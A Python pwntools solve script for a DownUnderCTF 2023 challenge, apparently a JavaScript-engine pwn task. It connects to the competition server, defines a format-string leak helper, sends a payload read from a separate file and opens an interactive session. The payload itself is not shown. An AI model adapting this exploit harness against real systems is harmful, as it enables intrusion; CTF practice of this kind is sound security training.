from pwn import *
fn = "./js"
context.log_level = "debug"
elf = ELF(fn, checksec=False)
context.binary = elf
libc = elf.libc
real = True
if real:
    # p = process(fn)
    p = remote("2023.ductf.dev", 30013)
else:
    p = gdb.debug(fn, """
    c
    """)
sla = lambda x, y: p.sendlineafter(x, y)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
num_to_bytes = lambda x: str(x).encode("ascii")
def gen_fmt(start, end):
    buf = ""
    for x in range(start, end):
        buf += f"%{x}$p."
    return buf[:-1]

# ======================================
# Exploit goes here
with open("clean2.js", "r") as f:
    stuff = f.read(-1)
    stuff = stuff.replace("\n", " ")
    sla(b">", stuff)

p.interactive()